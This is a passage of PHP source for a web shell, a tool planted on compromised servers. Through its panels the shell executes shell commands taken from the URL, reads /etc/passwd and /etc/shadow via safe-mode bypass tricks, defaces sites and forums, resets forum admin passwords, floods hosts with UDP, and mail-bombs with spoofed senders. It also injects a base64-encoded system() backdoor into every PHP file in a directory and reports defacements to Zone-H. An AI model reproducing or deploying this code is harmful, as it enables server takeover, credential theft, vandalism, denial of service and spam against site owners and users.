		echo "<center><font class=txt>File uploaded to $fullpath</font></center>"; 
	} 
	else 
		echo "<center>Failed to upload $namafile</center>"; 
}
else if(isset($_GET['createfolder']))
{
	if(!mkdir($_GET['createfolder']))
			echo "Failed To create";
	else
		echo "<font class=txt>Folder Created Successfully</font>";
}
else if(isset($_GET['selfkill']))
{
	if(unlink(__FILE__))
		echo "<br><center><font size=5>Good Bye......</font></center>";
	else
		echo "<br><center><font size=5>Shell cannot be removed......</font></center>";
}
else if(isset($_GET['Create']))
{
	?>
	<form method="post">
		<input type="hidden" name="filecreator" value="<?php echo $_GET['Create']; ?>">
		<textarea name="filecontent" rows="12" cols="100" class="box"></textarea><br />
        <input type="button" onClick="createfile(filecreator.value,filecontent.value)" value="  Save " class="but"/>
  </form>
		
<?php }
else if(isset($_POST['filecreator'])&&isset($_POST['filecontent']))
{
	$content = $_POST['filecontent'];
	if($file_pointer = fopen($_POST['filecreator'], "w+"))
	{
		fwrite($file_pointer, $content); 
		fclose($file_pointer);
		echo "<font class=txt>File Created Successfully</font>";
	}
	else
		echo "Cannot Create File";
}
else if(isset($_REQUEST["defaceforum"]))
{ 
	?>
	<center><div id="showdeface"></div>
	<font color="#FF0000" size="4">Forum Index Changer</font>
	<form action="<?php echo $self; ?>" method = "POST">
		<input type="hidden" name="forum">
		<input type="hidden" name="defaceforum">
		<table border = "1" width="60%" style="text-align: center;border-color:#333333;" align="center"> 
			<tr>
				<td height="50" width="50%"> <b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost"></td>
				
				<td width="50%"><b> Database :</b> <input type ="text" class="sbox" name = "f2" size="20"></td></tr>										 					
				<tr><td height="50" width="50%"><b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"> </td>
				<td><b> Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20"></td></tr>
			
				<tr><td height="50" width="50%">Type : 
				<select class=sbox id="forumdeface" name="forumdeface" onChange="checkforum(this.value)">
					<option value="vb">vbulletin</option>
					<option value="mybb">Mybb</option>
					<option value="smf">SMF</option>
					<option value="ipb">IPB</option>
					<option value="wp">Wordpress</option>
					<option value="joomla">Joomla</option>
				</select></td>
				<td height="50" width="50%">Prefix : <input type="text" id="tableprefix" name="tableprefix" class="sbox"></td></td>
				
			</tr>
			<tr>
				<td height="167" width="50%" colspan=2>
				<div style="display:none;" id="myjoomla"><p><b>Site URL : </b><input class="box" type="text" name="siteurl" width="80" value="http://site.com/administrator/"></p></div>
					
				<div style="display:none;" id="smfipb"><p align="center"><b>Head : </b><input class="sbox" type="text" name="head" size="20" value="Hacked">&nbsp; <b>Kate ID : </b><input class="sbox" type="text" name="f5" size="20" value="1">
				<label id="wordpres" style="display:none; float:right; margin-right:8%;"><input type="checkbox" name="all" value="All" checked="checked"> All</label></p>
				</div>
			
				<p align="center">&nbsp;<textarea class="box" name="index" cols=53 rows=8><b>lol ! You Are Hacked !!!!</b></textarea><p align="center">
				<input type="button" onClick="forumdefacefn(index.value,f1.value,f2.value,f3.value,f4.value,forumdeface.value,tableprefix.value,siteurl.value,head.value,all.value,f5.value)" class="but" value = "Hack It">
			</td>
		</tr>
	</table>
	</form>
		</center>	
	<?php 
		}
		else if(isset($_GET["passwordchange"]))
		{
			echo "<center>";
			?>
			<div id="showchangepass"></div>
			<font color="#FF0000" size="4">Forum Password Changer</font>
			<form onSubmit="changeforumpassword('forumpass',f1.value,f2.value,f3.value,f4.value,forums.value,tableprefix.value,ipbuid.value,newipbpass.value,username.value,newjoomlapass.value,uid.value,uname.value,newpass.value);return false;">
			<table border = "1" width="60%" height="246" style="text-align: center;border-color:#333333;" align="center"> 
				<tr>
					<td height="50" width="50%"> <b>Host : </b><input class="sbox" type="text" name="f1" size="20" value="localhost"></td><td height="50" width="50">&nbsp;<b>  DataBase :</b> <input type ="text" class="sbox" name = "f2" size="20"></td> <tr><td height="50" width="50%">&nbsp;<b>User :</b> <input type ="text" class="sbox" name = "f3" size="20"></td><td height="50" width="50%"> <b>Password :</b>&nbsp; <input class="sbox" type ="text" name = "f4" size="20"></td></tr>
					<tr>
					<td height="50" width="50%">Type : 
					<select class=sbox id="forums" name="forums" onChange="showMsg(this.value)">
					<option value="vb">vbulletin</option>
					<option value="mybb">Mybb</option>
					<option value="smf">SMF</option>
					<option value="ipb">IPB</option>
					<option value="phpbb">PHPBB</option>
					<option value="wp">Wordpress</option>
					<option value="joomla">Joomla</option>
					</select></td>
					<td height="50" width="50%">Prefix : <input type="text" id="tableprefix" name="tableprefix" class="sbox"></td>
				</tr>
				<tr>
					<td colspan=2 height="100" width="780">
					
					<p align="center"><div id="fid" style="display:block;"><b>User ID :</b> <input class="sbox" type="text" name="ipbuid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newipbpass" size="20" value="hacked"></div>
					
					<div id="joomla" style="display:none;"><b>New Username :</b> <input style="width:170px;" class="box" type="text" name="username" size="20" value="admin">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newjoomlapass" size="20" value="hacked"></div>
					
					<div id="wpress" style="display:none;"><p><b>User ID :</b> <input class="sbox" type="text" name="uid" size="20" value="1">&nbsp;<b>New Password :</b> <input type ="text" class="sbox" name = "newpass" size="20" value="hacked"></p><b>New Username :</b> <input style="width:170px;" class="box" type="text" name="uname" size="20" value="admin"></div>
					
					<p><input type = "button" onClick="changeforumpassword('forumpass',f1.value,f2.value,f3.value,f4.value,forums.value,tableprefix.value,ipbuid.value,newipbpass.value,username.value,newjoomlapass.value,uid.value,uname.value,newpass.value)" class="but" value = "  Change IT  " name="forumpass"></p></td>
				</tr>
			</table>
			</form>
		</center>	
			<?php
}
else if(isset($_GET['dosser']))
{
	if(isset($_GET['ip']) &&  isset($_GET['exTime']) && isset($_GET['port']) && isset($_GET['timeout']) && isset($_GET['exTime']) && $_GET['exTime'] != "" &&
		$_GET['port'] != "" && $_GET['ip'] != "" &&	$_GET['timeout'] != "" && $_GET['exTime'] != ""	)
	{
		   $IP=$_GET['ip'];
		   $port=$_GET['port'];
		   $executionTime = $_GET['exTime'];
		   $no0fBytes = $_GET['no0fBytes'];
		   $data = "";
		   $timeout = $_GET['timeout'];
		   $packets = 0;
		   $counter = $no0fBytes;
		   $maxTime = time() + $executionTime;;
		   while($counter--)
		   {
				$data .= "X";
		   }
		   $data .= " Dhanush"; 
		   
		   while(1)
		   {
				$socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
				if($socket)
				{
					fwrite($socket , $data);
					fclose($socket);
					$packets++;
				}
				if(time() >= $maxTime)
				{
					break;
				}
			}
			echo "Dos Completed!<br>";
			echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
			echo "Total Number of Packets Sent : " . $packets . "<br />";
			echo "Total Data Sent = ". HumanReadableFilesize($packets*$no0fBytes) . "<br />"; 
			echo "Data per packet = " . HumanReadableFilesize($no0fBytes) . "<br />";
	}
}
else if(isset($_GET['fuzzer']))
{
	if(isset($_GET['ip']) && isset($_GET['port']) && isset($_GET['timeout']) && isset($_GET['exTime']) && isset($_GET['no0fBytes']) && isset($_GET['multiplier']) && $_GET['no0fBytes'] != "" && $_GET['exTime'] != "" && $_GET['timeout'] != "" && $_GET['port'] != "" && $_GET['ip'] != "" && $_GET['multiplier'] != "")
    {
        $IP=$_GET['ip'];
        $port=$_GET['port'];
        $times = $_GET['exTime'];
		$timeout = $_GET['timeout'];
		$send = 0;
        $ending = "";
        $multiplier = $_GET['multiplier'];
        $data = "";
        $mode="tcp";
        $data .= "GET /";
        $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_GET['type'] == "tcp")
        {
            $mode = "tcp";
        }
	
        while($multiplier--)
        {
            $data .= urlencode($_GET['no0fBytes']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-Dhanush".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       for($i=0;$i<$times;$i++)
	{
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "Fuzzing Completed!<br>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($length) . "<br />";
    }
}
else if(isset($_GET['bypassit']))
{
	if(isset($_GET['copy']))
	{
		if(@copy($_GET['copy'],"test1.php")) 
		{
			$fh=fopen("test1.php",'r');
			echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars(@fread($fh,filesize("test1.php")))."</textarea></br></br>";
			@fclose($fh);
			unlink("test1.php");
		} 
	}
	else if(isset($_GET['imap']))
	{
		$string = $_GET['imap'];
		echo "<textarea cols=120 rows=20 class=box readonly>";
		$stream = imap_open($string, "", "");
		$str = imap_body($stream, 1);
		echo "</textarea>";
	}
	else if(isset($_GET['sql']))
	{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		$file=$_GET['sql'];
		
		$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
		$mysql_files = explode(':', $mysql_files_str);
			
		$sql = array (
			"USE $mdb",
				'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
				"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
				. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
				. "ESCAPED BY          '' "
				. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",
				
				"SELECT a FROM $tbl LIMIT 1"
				);
		mysql_connect ($mhost, $muser, $mpass);
				
		foreach ($sql as $statement) {
		   $q = mysql_query ($statement);
		
		   if ($q == false) die (
				  "FAILED: " . $statement . "\n" .
					  "REASON: " . mysql_error () . "\n"
				   );
				
		   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;
			
				   echo htmlspecialchars($r[0]);
				   mysql_free_result ($q);
				}
				echo "</textarea>";
			}
	else if(isset($_GET['curl']))
	{
		$ch=curl_init("file://" . $_GET[curl]);
		curl_setopt($ch,CURLOPT_HEADERS,0);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		$file_out=curl_exec($ch);
		curl_close($ch);
		echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars($file_out)."</textarea></br></br>";
	}
	else if(isset($_GET['include']))
	{
		if(file_exists($_GET['include']))
		{
			echo "<textarea cols=120 rows=20 class=box readonly>";
			@include($_GET['include']);
			echo "</textarea>";
		}
		else
			echo "<br><center><font  size=3>Can't Read" . $_GET['include'] . "</font></center>";
	}
	else if(isset($_GET['id']))
	{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		for($uid=0;$uid<60000;$uid++)
		{   //cat /etc/passwd
			$ara = posix_getpwuid($uid);
			if (!empty($ara)) 
			{
				while (list ($key, $val) = each($ara))
				{
					print "$val:";
				}
				print "\n";
			}
		}
		echo "</textarea>";
		break;
	}
	else if(isset($_GET['tempnam']))
	{
		$mytmp = tempnam ( 'tmp', $_GET['tempnam'] );
		$fp = fopen ( $mytmp, 'r' );
		while(!feof($fp))
			echo fgets($fp);
		fclose ( $fp );
	}
	else if(isset($_GET['symlnk']))
	{
		echo "<textarea cols=120 rows=20 class=box readonly>";
		@mkdir("mydhanush",0777);
		@chdir("mydhanush");
		execmd("ln -s /etc/passwd");
		
		echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/mydhanush/passwd");
		echo "</textarea>";
	}
	if(isset($_GET['newtype']))
	{
		$filename = $_GET['newtype'];
		echo "<textarea cols=120 rows=20 class=box readonly>";
		if($_GET['optiontype'] == "xxd")
			echo execmd("xxd ".$filename);
		else if($_GET['optiontype'] == "rev")
			echo execmd("rev ".$filename);
		if($_GET['optiontype'] == "tac")
			echo execmd("tac ".$filename);
		if($_GET['optiontype'] == "more")
			echo execmd("more ".$filename);
		if($_GET['optiontype'] == "less")
			echo execmd("less ".$filename);
		echo "</textarea>";
	}
}
// Deface Website
else if(isset($_GET['deface']))
{
	$myfile = fopen($_GET['deface'],'w');
	if(fwrite($myfile, base64_decode($ind)))
	{fclose($myfile);
	echo "Index Defaced Successfully";}
	else
		echo "Donot have write permission";
}
else if(isset($_GET['perms']))
{
?>
    <form>
	<input type="hidden" name="myfilename" value="<?php echo $_GET['myfilepath']; ?>">
        <table align="center" border="1" style="width:40%;border-color:#333333;">
            <tr>
                <td style="height:40px" align="right">Change Permissions </td><td align="center"><input value="0755" name="chmode" class="sbox" /></td> 
            </tr>
			<tr>
				<td colspan="2" align="center" style="height:60px">
        <input type="button" onClick="changeperms(chmode.value,myfilename.value)" value="Change Permission" class="but" style="padding: 5px;" /></td>
			</tr>
        </table>
		
	</form>   
    <?php
}
else if(isset($_GET["chmode"]))
{
	if($_GET['chmode'] != null && is_numeric($_GET['chmode']))
	{
		$perms = 0; 
        for($i=strlen($_GET['chmode'])-1;$i>=0;--$i) 
            $perms += (int)$_GET['chmode'][$i]*pow(8, (strlen($_GET['chmode'])-$i-1)); 
		if(@chmod($_GET['myfilename'],$perms))
			echo "<center><blink><font class=txt>File Permissions Changed Successfully</font></blink></center>";
		else
			echo "<center><blink>Cannot Change File Permissions</blink></center>";
	}
}
else if(isset($_GET['rename']))
{
?>
    <form>
	   <table border="0" cellpadding="3" cellspacing="3">
            <tr>
                <td>File </td><td><input value="<?php echo $_GET['myfilepath'];?>" name="file" class="box" /></td>
            </tr>
            <tr>
                <td>To </td><td><input value="<?php echo $_GET['myfilepath'];?>" name="to" class="box" /></td> 
            </tr>
			<tr>
				<td colspan="2"><input type="button" onClick="renamefun(file.value,to.value)" value="Rename It" class="but" style="margin-left: 160px;padding: 5px;"/></td>
			</tr>
        </table>
	</form>   
    <?php
  
}
else if(isset($_GET['renamemyfile']))
{
	if(isset($_GET['to']) && isset($_GET['file']))
	{
		 if(!rename($_GET['file'], $_GET['to']))
		 	echo "Cannot Rename File";
		else
			echo "<font class=txt>File Renamed Successfully</font>";
	
	}
}
else if(isset($_GET['open']))
{
	if(is_file($_GET['myfilepath']))
	{
		$owner = "0/0";
		if($os == "Linux")
			$owner = getOGid($_GET['myfilepath']);
		?>
			<form>
			<table style="width:57%;">
				<tr align="left">
					<td align="left">File : </td><td><font class=txt><?php echo $_GET['myfilepath'];?></font></td><td align="left">Permissions : </td><td><a href=javascript:void(0) onClick="fileaction('perms','<?php echo addslashes($_GET['myfilepath']); ?>')"><?php echo filepermscolor($_GET['myfilepath']);?></a></td>
				</tr>
				<tr>
					<td>Size : </td><td><?php echo HumanReadableFileSize(filesize($_GET['myfilepath']));?></td><td>Owner/Group : </td><td><font class=txt><?php echo $owner;?></font></td> 
				</tr>
			</table>
			<textarea name="content" rows="15" cols="100" class="box"><?php
			$content = htmlspecialchars(file_get_contents($_GET['myfilepath']));
			if($content)
			{
				echo $content;
			}
			else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
			{
				if(filesize($_GET['myfilepath']) != 0 )
				{
					fopen($_GET['myfilepath']);
					while(!feof())
					{
						echo htmlspecialchars(fgets($_GET['myfilepath']));
					}
				}
			}
	
			?>
			</textarea><br />
			<input name="save" type="button" onClick="savemyfile('<?php echo addslashes($_GET['myfilepath']); ?>',content.value)" value="Save Changes" id="spacing" class="but"/>
			</form>
    <?php
	}
	else
		echo "File does not exist !!!!";
}
else if(isset($_POST['file']) && isset($_POST['content']))
{
    if(file_exists($_POST['file']))
    {
        $handle = fopen($_POST['file'],"w");
        if(fwrite($handle,$_POST['content']))
        	echo "<font class=txt>File Saved Successfully!</font>";
	else
		echo "Cannot Write into File";
    }
    else
    {
        echo "File Name Specified does not exists!";
    }
}
else if(isset($_POST["SendNowToZoneH"]))
{
	$hacker = $_POST['defacer'];
	$method = $_POST['hackmode'];
	$neden = $_POST['reason'];
	$site = $_POST['domain'];
	
	if (empty($hacker))
	{
		die("<center><font  size=3>[-] You Must Fill the Attacker name !</font></center>");
	}
	elseif($method == "--------SELECT--------") 
	{
		die("<center><font  size=3>[-] You Must Select The Method !</center>");
	}
	elseif($neden == "--------SELECT--------") 
	{
		die("<center><font  size=3>[-] You Must Select The Reason</center>");
	}
	elseif(empty($site)) 
	{
		die("<center><font  size=3>[-] You Must Inter the Sites List !</center>");
	}
	// Zone-h Poster
	function ZoneH($url, $hacker, $hackmode,$reson, $site )
	{
		$k = curl_init();
		curl_setopt($k, CURLOPT_URL, $url);
		curl_setopt($k,CURLOPT_POST,true);
		curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
		curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
		$kubra = curl_exec($k);
		curl_close($k);
		return $kubra;
	}
	
	$i = 0;
    $sites = explode("\n", $site);
    echo "<pre class=ml1 style='margin-top:5px'>";
	while($i < count($sites)) 
	{
		if(substr($sites[$i], 0, 4) != "http") 
		{
				$sites[$i] = "http://".$sites[$i];
		}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "<font class=txt size=3>Site : ".$sites[$i]." Posted !</font><br>";
		++$i;
	}
		 
	echo "<font class=txt size=4>Sending Sites To Zone-H Has Been Completed Successfully !! </font></pre>";
}
else if(isset($_GET['executemycmd']))
{
	$comm = $_GET['executemycmd'];
	chdir($_GET['executepath']);
	echo shell_exec($comm);
}
// View Passwd file
else if(isset($_GET['passwd']))
{
	$test='';
    	$tempp= tempnam($test, "cx");
	$get = "/etc/passwd";
	$name=@posix_getpwuid(@fileowner($get)); 
	$group=@posix_getgrgid(@filegroup($get)); 
	$owner = $name['name']. " / ". $group['name']; 
	?>
	<table style="width:57%;">
            <tr>
                <td align="left">File : </td><td><font class=txt><?php echo $get; ?></font></td><td align="left">Permissions : </td><td><?php echo filepermscolor($get);?></td>
            </tr>
            <tr>
                <td>Size : </td><td><?php echo filesize($get);?></td><td>Owner/Group : </td><td><font class=txt><?php echo $owner;?></font></td> 
            </tr>
        </table>
	<?php
	if(copy("compress.zlib://".$get, $tempp))
	{
		$fopenzo = fopen($tempp, "r");
		$freadz = fread($fopenzo, filesize($tempp));
		fclose($fopenzo);
		$source = htmlspecialchars($freadz);
		echo "<tr><td><center><textarea rows='20' cols='80' class=box name='source'>$source</textarea><br>";
		unlink($tempp);
    	} 
	else 
	{
   	?>
		<form>
			<input type="hidden" name="etcpasswd">
			<table class="tbl" border="1" cellpadding="5" cellspacing="5" align="center" style="width:40%;">
			<tr>
				<td>From : </td><td><input type="text" name="val1" class="sbox" value="1"></td>
			</tr>
			<tr>
				<td>To : </td><td><input type="text" name="val2" class="sbox" value="1000"></td>
			</tr>
			<tr>
				<td colspan="2" align="center"><input type="submit" value="  Go  " class="but"></td>
			</tr>
			</table><br>
		</form>
		<?php 
	}
}
else if(isset($_GET['shadow']))
{
	$test='';
    	$tempp= tempnam($test, "cx");
	$get = "/etc/shadow";
	if(copy("compress.zlib://".$get, $tempp))
	{
		$fopenzo = fopen($tempp, "r");
		$freadz = fread($fopenzo, filesize($tempp));
		fclose($fopenzo);
		$source = htmlspecialchars($freadz);
		echo "<tr><td><center><font size='3' face='Verdana'>$get</font><br><textarea rows='20' cols='80' class=box name='source'>$source</textarea>";
		unlink($tempp);
    	} 
}
else if(isset($_GET['bomb']))
{
	?><div id="showmail"></div>
	<form>
	<table id="margins" style="width:100%;">
		<tr>
			<td style="width:30%;">To</td>
			<td>
				<input class="box" name="to" value="victim@domain.com,victim2@domain.com" onFocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onBlur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
			</td>
		</tr>
		<tr>
			<td style="width:30%;">Subject</td>
			<td>
				<input type="text" class="box" name="subject" value="Dhanush Here!" onFocus="if(this.value == 'Dhanush Here!')this.value = '';" onBlur="if(this.value=='')this.value='Dhanush Here!';" />
			</td>
		</tr>
		 <tr>
			<td style="width:30%;">No. of Times</td>
			<td>
				<input class="box" name="times" value="100" onFocus="if(this.value == '100')this.value = '';" onBlur="if(this.value=='')this.value='100';"/>
			</td>
		</tr>
		<tr>
			<td style="width:30%;">Pad your message (Less spam detection)</td>
			<td><input type="checkbox" name="padding"/></td>
		</tr>
		<tr>
			<td colspan="2"><textarea name="message" cols="110" rows="10" class="box">Hello !! This is Dhanush!!</textarea></td>
		</tr>
		<tr>
			<td rowspan="2">
				<input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="button" onClick="sendmail('dobombing',to.value,subject.value,message.value,'null',times.value,padding.value)" class="but" value="    Bomb!  "/>
			</td>
		</tr>
	</table>            
	</form>
	<?php
}

//Mass Mailer
else if(isset($_GET['mail']))
{
        ?><div id="showmail"></div>
		<div align="left">
        <form>
           <table align="left" style="width:100%;">
                <tr>
                    <td style="width:10%;">From</td>
                    <td style="width:80%;" align="left"><input name="from" class="box" value="Hello@abcd.in" onFocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onBlur="if(this.value=='')this.value='president@whitehouse.gov';"/></td>
                </tr>
                
                <tr>
                    <td style="width:20%;">To</td>
                    <td style="width:80%;"><input class="box" class="box" name="to" value="victim@domain.com,victim2@domain.com" onFocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onBlur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/></td>
                </tr>
                
                <tr>
                    <td style="width:20%;">Subject</td>
                    <td style="width:80%;"><input type="text" class="box" name="subject" value="Dhanush Here!!" onFocus="if(this.value == 'Dhanush Here!!')this.value = '';" onBlur="if(this.value=='')this.value='Dhanush Here!!';" /></td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="box">Hello !! This is Dhanush!!!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="button" onClick="sendmail('massmailing',to.value,subject.value,message.value,from.value)" class="but" value="   Send! "/>
                    </td>
                </tr>
            </table>            
        </form></div>   
        <?php
}
// Get Domains
else if(isset($_REQUEST["symlinkserver"]))
{
	?>
	<center><table><tr>
	<td><a href=javascript:void(0) onClick="getdata('domains')"><font class=txt><b>| Get Domains |</b></font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('symlink')"><font class=txt><b>| Symlink Server |</b></font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('symlinkfile')"><font class=txt><b>| Symlink File |</b></font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('script')"><font class=txt><b>| Script Locator |</b></font></a></td>
	</tr></table></center><br>
	<div id="showdata"></div><?php
}
// Forum Manager
else if(isset($_REQUEST["forum"]))
{ ?>
	<center><table><tr><td><a href=# onClick="getdata('defaceforum')"><font class=txt size="4">| Forum Defacer |</font></a></td>
	<td><a href=# onClick="getdata('passwordchange')"><font class=txt size="4">| Forum Password Changer |</font></a></td>
	</tr></table></center><br><div id="showdata"></div>
	<?php 
}
// Sec info
else if(isset($_GET['secinfo']))
{ ?><div id=showdata></div>
<center><div id="showmydata"></div>
</center>
<br><center><font color =red size=5>Server security information</font><br><br></center>
	<table style="width:100%;border-color:#333333;" border="1">
	<tr>
		<td style="width:7%;">Curl</td>
		<td style="width:7%;">Oracle</td>
		<td style="width:7%;">MySQL</td>
		<td style="width:7%;">MSSQL</td>
		<td style="width:7%;">PostgreSQL</td>
		<td style="width:12%;">Open Base Directory</td>
		<td style="width:10%;">Safe_Exec_Dir</td>
		<td style="width:7%;">PHP Version</td>
		<td style="width:7%;">Magic Quotes</td> 
		<td style="width:7%;">Server Admin</td> 
	</tr>
	<tr>
		<td style="width:7%;"><font class="txt"><?php curlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php oracleinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php mysqlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php mssqlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php postgresqlinfo(); ?></font></td>
		<td style="width:12%;"><font class="txt"><?php echo $basedir; ?></font></td>
		<td style="width:10%;"><font class="txt"><?php if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_exec_dir'))) {echo "<font >NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};} ?></font></td>
		<td style="width:7%;"><font class="txt"><?php phpver(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php magic_quote(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php serveradmin(); ?></font></td>
	</tr>
</table><br> <?php
	mysecinfo();
}
// Code Injector

else if(isset($_GET['injector']))
{
    ?>
	<form method='POST'>
        <table id="margins">
        <tr>
            <td width="100" class="title">
                        Directory
                    </td>
                    <td>
                         <input class="box" name="pathtomass" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
					
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 400px;" name="mode" class="box">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="box" name="filetype" value="php" onBlur="if(this.value=='')this.value='php';" />
                    </td>
                </tr>
                <tr>
			<td>Create A backdoor by injecting this code in every php file of current directory</td>
		</tr>
                
                <tr>
                    <td colspan="2">
                        <textarea name="injectthis" cols="110" rows="10" class="box"><?php echo base64_decode("PD9waHAgJGNtZCA9IDw8PEVPRA0KY21kDQpFT0Q7DQoNCmlmKGlzc2V0KCRfUkVRVUVTVFskY21kXSkpIHsNCnN5c3RlbSgkX1JFUVVFU1RbJGNtZF0pOyB9ID8+"); ?></textarea>
                    </td>
                </tr>
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="button" onClick="codeinjector(pathtomass.value,mode.value,filetype.value,injectthis.value)" class="but" value="Inject "/>
                    </td>
                </tr>
        </form>
        </table><div id="showinject"</div>
		<?php
}
// Bypass
else if(isset($_GET["bypass"]))
{
	?><center><div id="showbyp"></div></center>
	<table cellpadding="7" align="center" border="3" style="width:70%;border-color:#333333;">
		<tr>
			<td align="center" colspan="2"><font color="#FF0000" size="3">Safe mode bypass</font></td>
		</tr>
		<tr>
			<td align="center">
				<p>Using copy() function</p>
				<form onSubmit="bypassfun('copy',copy.value);return false;">
				<input type="text" name="copy" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('copy',copy.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using imap() function</p>
						<form onSubmit="bypassfun('imap',imap.value);return false;">
						<input type="text" name="imap" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('imap',imap.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
						
				<tr>
					<td align="center">
						<p>Using sql() function</p>
						<form onSubmit="bypassfun('sql',sql.value);return false;">
						<input type="text" name="sql" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('sql',sql.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using Curl() function</p>
						<form onSubmit="bypassfun('curl',curl.value);return false;">
						<input type="text" name="curl" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('curl',curl.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
						
				<tr>
					<td align="center">
						<p>Bypass using include()</p>
						<form onSubmit="bypassfun('include',include.value);return false;">
						<input type="text" name="include" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('include',include.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using id() function</p>
						<form onSubmit="bypassfun('id',id.value);return false;">
						<input type="text" name="id" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('id',id.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
							
				<tr>
					<td align="center">
						<p>Using tempnam() function</p>
						<form onSubmit="bypassfun('tempnam',tempname.value);return false;">
						<input type="text" name="tempname" value="../../../etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('tempnam',tempname.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using symlink() function</p>
						<form onSubmit="bypassfun('symlnk',sym.value);return false;">
						<input type="text" name="sym" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('symlnk',sym.value)" value="bypass" class="but">
					</form>
					</td>
				</tr>
				<tr>
					<td colspan=2 align="center">
						<p>Using Bypass function</p>
						<form onSubmit="bypassfun('newtype',newtype.value,optiontype.value);return false;">
						<input type="text" name="newtype" value="/etc/passwd" class="sbox"> 
						<select id="optiontype" class=sbox>
						<option value="tac">tac</option>
						<option value="more">more</option>
						<option value="less">less</option>
						<option value="rev">rev</option>
						<option value="xxd">xxd</option>
						</select>
						<input type="button" OnClick="bypassfun('newtype',newtype.value,optiontype.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
		</table>
	</form>
	<?php
}
//fuzzer
else if(isset($_GET['fuzz']))
{
    ?>
        <form method="GET">
           <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="box" name="myip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="box" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
